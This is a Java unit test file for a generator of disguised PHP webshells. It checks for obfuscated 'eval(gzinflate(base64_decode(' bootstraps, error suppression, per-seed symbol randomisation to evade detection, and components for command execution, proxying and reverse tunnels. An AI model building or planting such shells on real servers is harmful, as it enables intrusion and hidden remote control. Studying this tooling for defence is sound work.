package org.leo.phpcore.generator;

import org.junit.jupiter.api.Test;
import org.leo.core.entity.Disguise;
import org.leo.core.generator.GeneratedArtifact;
import org.leo.core.generator.GenerationRequest;
import org.leo.core.runtime.PuppetRuntime;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.Inflater;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class PhpScriptGeneratorProviderTest {

    @Test
    void generatesCompatibleMinifiedCompactSourceWithRandomizedCore() throws Exception {
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        Map<String, Object> options = Map.of("outputMode", "compact", "seed", "fixed-seed",
                "respCode", 202, "headerName", "X-Leo", "headerValue", "token");
        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"), options);
        GeneratedArtifact portable = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "portable", "seed", "fixed-seed", "respCode", 202,
                        "headerName", "X-Leo", "headerValue", "token"));

        String source = artifact.getContent();
        assertEquals("php", artifact.getFileExtension());
        assertEquals(2, ((Number) artifact.getMetadata().get("protocolVersion")).intValue());
        assertEquals("M0-M3", artifact.getMetadata().get("coreProtocol"));
        assertEquals("compact", artifact.getMetadata().get("outputMode"));
        assertEquals("minified-php", artifact.getMetadata().get("bootstrapEncoding"));
        assertEquals("fixed-seed", artifact.getMetadata().get("generationSeed"));
        assertTrue(source.startsWith("<?php"));
        assertFalse(source.contains("gzinflate"));
        assertFalse(source.contains("eval("));
        assertTrue(source.contains("http_response_code(202);"));
        assertTrue(source.contains("$_SERVER['HTTP_X_LEO']"));
        assertTrue(source.contains("function leo_request_decode($body)"));
        assertTrue(source.contains("@error_reporting(0);"));
        assertTrue(source.contains("['componentKey']"));
        assertTrue(source.contains("===0"));
        assertTrue(source.contains("===1"));
        assertTrue(source.contains("===2"));
        assertTrue(source.contains("===3"));
        assertFalse(source.contains("phpcore_"));
        assertFalse(source.contains("componentDigest"));
        assertFalse(source.contains("'msg'"));
        assertFalse(source.contains("hash_file('sha256'"));
        assertFalse(source.contains("hash('sha256'"));
        assertFalse(source.contains("function leo_basic_info"));
        assertFalse(source.contains("{{"));
        assertEquals("on-demand-disk-cache", artifact.getMetadata().get("componentDeliveryMode"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ExecCommandComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("HttpRequestComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ProxyForwardComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ReverseTunnelComponent"));
        assertTrue(artifact.getMetadata().get("componentRequirements") instanceof Map<?, ?>);
        Map<?, ?> componentRequirements = (Map<?, ?>) artifact.getMetadata().get("componentRequirements");
        Map<?, ?> databaseRequirements = (Map<?, ?>) componentRequirements.get("DatabaseComponent");
        assertEquals(List.of("PDO"), databaseRequirements.get("classes"));
        assertTrue(((List<?>) databaseRequirements.get("pdoDriversAnyOf"))
                .containsAll(List.of("mysql", "pgsql", "sqlsrv", "dblib", "oci", "sqlite")));
        assertEquals(List.of(), artifact.getMetadata().get("bundledComponents"));
        Map<?, ?> requirements = (Map<?, ?>) artifact.getMetadata().get("requirements");
        assertFalse(requirements.containsKey("extensions"));
        assertFalse(requirements.containsKey("functions"));
        assertTrue(source.length() < portable.getContent().length());
        assertTrue(source.length() < 8_000, "minimal compact bootstrap regressed in size");
    }

    @Test
    void keepsPreviousDeflateBootstrapAsExplicitPackedMode() throws Exception {
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "packed", "seed", "fixed-seed"));

        assertEquals("packed", artifact.getMetadata().get("outputMode"));
        assertEquals("deflate-base64", artifact.getMetadata().get("bootstrapEncoding"));
        assertTrue(artifact.getContent().startsWith("<?php eval(gzinflate(base64_decode('"));
        String expanded = unpack(artifact.getContent());
        assertTrue(expanded.contains("['componentKey']"));
        assertFalse(expanded.contains("phpcore_"));
        Map<?, ?> requirements = (Map<?, ?>) artifact.getMetadata().get("requirements");
        assertTrue(((List<?>) requirements.get("extensions")).contains("zlib"));
        assertTrue(((List<?>) requirements.get("functions")).contains("gzinflate"));
        assertTrue(artifact.getContent().length() < 4_000, "minimal packed bootstrap regressed in size");
    }

    @Test
    void generatesPortableSourceAndMergesBothDisguiseRequirements() throws Exception {
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        Disguise request = disguise("request");
        request.setRequirements(Map.of("php", Map.of("minVersion", "5.6", "extensions", Set.of("json"))));
        Disguise response = disguise("response");
        response.setRequirements(Map.of("php", Map.of("minVersion", "7.1",
                "extensions", Set.of("openssl"), "functions", Set.of("openssl_encrypt"))));

        GeneratedArtifact artifact = generate(provider, request, response,
                Map.of("outputMode", "portable", "seed", "fixed-seed", "respCode", 200));

        assertEquals("portable", artifact.getMetadata().get("outputMode"));
        assertEquals("plain-php", artifact.getMetadata().get("bootstrapEncoding"));
        assertEquals("7.1", artifact.getMetadata().get("minimumVersion"));
        assertTrue(artifact.getContent().startsWith("<?php"));
        assertFalse(artifact.getContent().contains("gzinflate"));
        assertFalse(artifact.getContent().contains("HTTP_X_LEO"));
        assertFalse(artifact.getContent().contains("phpcore_"));
        assertTrue(artifact.getContent().contains("\n"));
        Map<?, ?> requirements = (Map<?, ?>) artifact.getMetadata().get("requirements");
        assertEquals("7.1", requirements.get("minVersion"));
        assertTrue(((List<?>) requirements.get("extensions")).containsAll(List.of("json", "openssl")));
        assertTrue(((List<?>) requirements.get("functions")).contains("openssl_encrypt"));
        assertFalse(((List<?>) requirements.get("extensions")).contains("zlib"));
    }

    @Test
    void changesInternalSymbolsAcrossGenerationSeeds() throws Exception {
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        GeneratedArtifact first = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "compact", "seed", "seed-a"));
        GeneratedArtifact second = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "compact", "seed", "seed-b"));

        assertNotEquals(first.getContent(), second.getContent());
        assertNotEquals(first.getMetadata().get("variantId"), second.getMetadata().get("variantId"));
    }

    @Test
    void rejectsLegacyOrNonPhpDisguises() {
        Disguise legacy = disguise("legacy");
        legacy.setProtocolVersion(1);
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        assertThrows(IllegalArgumentException.class, () -> generate(provider, legacy, disguise("response"), Map.of()));

        Disguise incomplete = disguise("incomplete");
        incomplete.setPhpEncodeBody(null);
        assertThrows(IllegalArgumentException.class,
                () -> generate(provider, incomplete, disguise("response"), Map.of()));
        assertThrows(IllegalArgumentException.class, () -> generate(provider, disguise("request"),
                disguise("response"), Map.of("outputMode", "unknown")));
        assertThrows(IllegalArgumentException.class, () -> generate(provider, disguise("request"),
                disguise("response"), Map.of("respCode", 204)));
    }

    private GeneratedArtifact generate(PhpScriptGeneratorProvider provider, Disguise request,
                                       Disguise response, Map<String, Object> options) throws Exception {
        return provider.generate(new GenerationRequest(PuppetRuntime.PHP, "webshell", request, response, options));
    }

    private Disguise disguise(String id) {
        Disguise disguise = new Disguise();
        disguise.setDisguiseId(id);
        disguise.setSchemaVersion(2);
        disguise.setProtocolVersion(2);
        disguise.setSupportedRuntimes(Set.of("php"));
        disguise.setEncodeBody("java encode");
        disguise.setDecodeBody("java decode");
        disguise.setPhpEncodeBody("return base64_encode(json_encode(leo_wire_encode($payload))); ");
        disguise.setPhpDecodeBody("return leo_wire_decode(json_decode(base64_decode($body), true));");
        return disguise;
    }

    private String unpack(String wrapper) throws Exception {
        String marker = "base64_decode('";
        int start = wrapper.indexOf(marker) + marker.length();
        int end = wrapper.indexOf("')));", start);
        byte[] compressed = Base64.getDecoder().decode(wrapper.substring(start, end));
        Inflater inflater = new Inflater(true);
        inflater.setInput(compressed);
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[2048];
        try {
            while (!inflater.finished()) {
                int count = inflater.inflate(buffer);
                if (count <= 0) throw new IllegalStateException("inflate failed");
                output.write(buffer, 0, count);
            }
        } finally {
            inflater.end();
        }
        return output.toString(StandardCharsets.UTF_8);
    }
}
